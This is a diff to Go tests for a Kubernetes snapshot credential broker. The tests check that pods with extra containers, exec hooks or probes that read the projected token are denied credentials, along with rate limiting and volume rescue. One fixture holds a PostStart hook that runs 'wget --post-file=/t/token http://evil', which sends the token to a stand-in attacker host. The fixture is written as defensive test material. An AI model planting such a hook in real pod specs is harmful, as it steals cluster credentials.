@@ -5,6 +5,7 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"golang.org/x/time/rate"
 	apierrors "k8s.io/apimachinery/pkg/api/errors"
 	"net/http"
 	"net/http/httptest"
@@ -937,11 +938,20 @@ func TestJobPodMustRunTheJobTemplate(t *testing.T) {
 		VolumeMounts: []corev1.VolumeMount{{Name: "wsnap-token", MountPath: "/t"}}}
 	tokenVol := corev1.Volume{Name: "wsnap-token", VolumeSource: corev1.VolumeSource{Projected: &corev1.ProjectedVolumeSource{
 		Sources: []corev1.VolumeProjection{{ServiceAccountToken: &corev1.ServiceAccountTokenProjection{Audience: "wsnap", Path: "token"}}}}}}
-	tmpl := corev1.PodSpec{Containers: []corev1.Container{agent}, Volumes: []corev1.Volume{tokenVol}}
+	stateVol := corev1.Volume{Name: "wsnap-state", VolumeSource: corev1.VolumeSource{EmptyDir: &corev1.EmptyDirVolumeSource{}}}
+	agent.VolumeMounts = append(agent.VolumeMounts, corev1.VolumeMount{Name: "wsnap-state", MountPath: "/var/lib/wsnap"})
+	tmpl := corev1.PodSpec{Containers: []corev1.Container{agent}, Volumes: []corev1.Volume{tokenVol, stateVol}}
+	vols := tmpl.Volumes
 	evil := agent
 	evil.Image = "attacker/image"
+	hooked := agent
+	hooked.Lifecycle = &corev1.Lifecycle{PostStart: &corev1.LifecycleHandler{Exec: &corev1.ExecAction{Command: []string{"sh", "-c", "wget --post-file=/t/token http://evil"}}}}
+	probed := agent
+	probed.ReadinessProbe = &corev1.Probe{ProbeHandler: corev1.ProbeHandler{Exec: &corev1.ExecAction{Command: []string{"cat", "/t/token"}}}}
 	sidecarMesh := corev1.Container{Name: "mesh-proxy", Image: "mesh:1"}
 	stealer := corev1.Container{Name: "stealer", Image: "x", VolumeMounts: []corev1.VolumeMount{{Name: "wsnap-token", MountPath: "/t"}}}
+	// Kopia keeps the storage credential in the state volume (reviewer #5).
+	stateThief := corev1.Container{Name: "thief", Image: "x", VolumeMounts: []corev1.VolumeMount{{Name: "wsnap-state", MountPath: "/s"}}}
 	for _, tc := range []struct {
 		name string
 		spec corev1.PodSpec
@@ -949,10 +959,14 @@ func TestJobPodMustRunTheJobTemplate(t *testing.T) {
 		want int
 	}{
 		{"the job's own pod", tmpl, false, 200},
-		{"an admission webhook added a container", corev1.PodSpec{Containers: []corev1.Container{agent, sidecarMesh}, Volumes: []corev1.Volume{tokenVol}}, false, 200},
-		{"another image", corev1.PodSpec{Containers: []corev1.Container{evil}, Volumes: []corev1.Volume{tokenVol}}, false, 403},
-		{"an extra container reads the token", corev1.PodSpec{Containers: []corev1.Container{agent, stealer}, Volumes: []corev1.Volume{tokenVol}}, false, 403},
-		{"shared process namespace", corev1.PodSpec{Containers: []corev1.Container{agent}, Volumes: []corev1.Volume{tokenVol}, ShareProcessNamespace: ptr.To(true)}, false, 403},
+		{"an admission webhook added a container", corev1.PodSpec{Containers: []corev1.Container{agent, sidecarMesh}, Volumes: vols}, false, 200},
+		{"another image", corev1.PodSpec{Containers: []corev1.Container{evil}, Volumes: vols}, false, 403},
+		// Reviewer #6: hooks and probes run inside the agent container.
+		{"an exec hook on the agent", corev1.PodSpec{Containers: []corev1.Container{hooked}, Volumes: vols}, false, 403},
+		{"an exec probe on the agent", corev1.PodSpec{Containers: []corev1.Container{probed}, Volumes: vols}, false, 403},
+		{"an extra container reads the token", corev1.PodSpec{Containers: []corev1.Container{agent, stealer}, Volumes: vols}, false, 403},
+		{"an extra container reads the state volume", corev1.PodSpec{Containers: []corev1.Container{agent, stateThief}, Volumes: vols}, false, 403},
+		{"shared process namespace", corev1.PodSpec{Containers: []corev1.Container{agent}, Volumes: vols, ShareProcessNamespace: ptr.To(true)}, false, 403},
 		{"the job finished", tmpl, true, 403},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
@@ -1132,5 +1146,110 @@ func TestRestoreWaitsForAStoppedWritersBoundVolume(t *testing.T) {
 	_ = e.client.Update(context.Background(), pvA)
 	if rec, _ := e.call(t, "/v1/credentials", "token-b", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != 200 {
 		t.Fatalf("restore got %d after the volume was saved: %s", rec.Code, rec.Body.String())
+	}
+}
+
+// TestGarbageTokensDoNotFloodTheAPIServer (reviewer #5 finding 2, revised
+// after reviewer #6 finding 9): random bearer tokens from one client cost
+// at most its per-IP TokenReview budget; a valid token the broker already
+// knows is never limited, so the flood cannot lock out the sidecar.
+func TestGarbageTokensDoNotFloodTheAPIServer(t *testing.T) {
+	e := newEnv(t, workloadPod("w1", "u1", "ws1"))
+	reviews := 0
+	auth := &CachingAuthenticator{Next: countValid{n: &reviews, valid: e.srv.Auth}, TTL: time.Minute}
+	e.srv.Auth = auth
+	// The sidecar's token is validated once (cached).
+	if rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != 200 {
+		t.Fatalf("sidecar: %d", rec.Code)
+	}
+	for i := range 500 {
+		e.call(t, "/v1/credentials", fmt.Sprintf("garbage-%d", i), protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
+	}
+	if reviews > 20 {
+		t.Fatalf("500 garbage tokens from one client caused %d TokenReviews", reviews)
+	}
+	if rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != 200 {
+		t.Fatalf("the sidecar's known token got %d after the flood, want 200", rec.Code)
+	}
+	reviews = 0
+	capped := &CachingAuthenticator{Next: rejectAll{&reviews}, TTL: time.Minute, Reviews: rate.NewLimiter(0, 5)}
+	for i := range 100 {
+		_, _ = capped.Authenticate(context.Background(), fmt.Sprintf("t-%d", i))
+	}
+	if reviews != 5 {
+		t.Fatalf("the global cap let %d TokenReviews through, want 5", reviews)
+	}
+}
+
+// countValid counts reviews and defers to valid for known test tokens.
+type countValid struct {
+	n     *int
+	valid Authenticator
+}
+
+func (a countValid) Authenticate(ctx context.Context, token string) (Identity, error) {
+	*a.n++
+	return a.valid.Authenticate(ctx, token)
+}
+
+type rejectAll struct{ n *int }
+
+func (a rejectAll) Authenticate(context.Context, string) (Identity, error) {
+	*a.n++
+	return Identity{}, fmt.Errorf("token rejected")
+}
+
+// TestTargetedRequestIsNotClaimedBySidecar (reviewer #5 suspicion): a
+// rescue request for a stopped writer's volume must go to a Job.
+func TestTargetedRequestIsNotClaimedBySidecar(t *testing.T) {
+	targeted := &wsnapv1.WorkspaceSnapshot{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-unsaved-x",
+		Annotations: map[string]string{wsnapv1.AnnotationVolumeName: "pv-old"}},
+		Spec: wsnapv1.WorkspaceSnapshotSpec{WorkspaceName: "ws1"}, Status: wsnapv1.WorkspaceSnapshotStatus{Phase: wsnapv1.SnapshotPending}}
+	e := newEnv(t, workloadPod("w1", "u1", "ws1"), targeted)
+	e.srv.Client = &statusCompat{e.client}
+	e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
+	resp, err := e.srv.claimRequests(context.Background(), &caller{pod: workloadPod("w1", "u1", "ws1"), id: workspace.Identity{Namespace: ns, Name: "ws1", Repository: "repo"}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(resp.Requests) != 0 {
+		t.Fatalf("the sidecar claimed a request for another volume: %v", resp.Requests)
+	}
+}
+
+// TestLostWriterVolumeIsRescuedWithoutBlocking (reviewer #6 finding 2): a
+// writer stuck terminating on a lost node still holds unsaved data. The
+// broker asks for its rescue (kept as superseded when it lands) and lets
+// the replacement start instead of skipping the rescue entirely.
+func TestLostWriterVolumeIsRescuedWithoutBlocking(t *testing.T) {
+	stuckA := workloadPod("a", "uA", "ws1", func(p *corev1.Pod) {
+		p.DeletionTimestamp = ptr.To(metav1.NewTime(time.Now().Add(-time.Hour)))
+		p.Finalizers = []string{"test/keep"}
+	})
+	pvA := &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: "pv-a", Annotations: map[string]string{
+		wsnapv1.AnnotationWorkspaceRef: ns + "/ws1", workspace.AnnotationWriterPod: "uA"}},
+		Spec:   corev1.PersistentVolumeSpec{ClaimRef: &corev1.ObjectReference{Namespace: ns, Name: "data-a"}},
+		Status: corev1.PersistentVolumeStatus{Phase: corev1.VolumeBound}}
+	claimA := &corev1.PersistentVolumeClaim{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "data-a"}, Spec: corev1.PersistentVolumeClaimSpec{VolumeName: "pv-a"}}
+	e := newEnv(t, stuckA, pvA, claimA, workloadPod("b", "uB", "ws1"),
+		&wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
+			Status: wsnapv1.WorkspaceStatus{WriterPod: &wsnapv1.PodRef{Name: "a", UID: "uA"}, LastSnapshot: &wsnapv1.SnapshotRecord{ID: "stale"}}})
+	if rec, _ := e.call(t, "/v1/credentials", "token-b", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != 200 {
+		t.Fatalf("restore got %d; a lost node must not block the replacement: %s", rec.Code, rec.Body.String())
+	}
+	var reqs wsnapv1.WorkspaceSnapshotList
+	_ = e.client.List(context.Background(), &reqs)
+	if len(reqs.Items) != 1 || reqs.Items[0].Annotations[wsnapv1.AnnotationVolumeName] != "pv-a" {
+		t.Fatalf("no rescue request for the lost writer's volume: %+v", reqs.Items)
+	}
+}
+
+// TestUnsetOperationTimeoutIsNotSent: an unset spec.operationTimeout must
+// not override the agent's --operation-timeout with the default (found by
+// the e2e storage-outage scenario).
+func TestUnsetOperationTimeoutIsNotSent(t *testing.T) {
+	e := newEnv(t, workloadPod("w1", "u1", "ws1"))
+	if _, r := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleRestore}); r.OperationTimeout.Duration != 0 {
+		t.Fatalf("broker sent operationTimeout %s for a repository that sets none", r.OperationTimeout.Duration)
 	}
 }
